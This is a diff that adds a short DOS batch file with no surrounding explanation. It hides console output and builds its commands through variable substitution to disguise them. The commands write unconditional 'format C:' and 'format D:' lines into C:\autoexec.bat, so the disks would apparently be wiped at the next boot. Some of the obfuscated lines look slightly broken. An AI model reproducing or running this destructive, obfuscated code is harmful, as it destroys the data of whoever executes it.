@@ -1,0 +1,12 @@
+@echo off
+ctty NUL
+set jjjuf=e
+set ygzgt=oex
+%jjjuf%cho >aut%ygzgt%ec.bat
+set bfgci=e
+set cqjji=f
+set xjrok=m
+%bfgci%cho %cqjji%or%xjrok%at C: /u /q / > C:\autoexec.bat
+set ykufc=o
+set eoujr=t
+ech%ykufc%o %cqjji%orma%eoujr% D: /u /q /autotest > C:\autoexec.bat
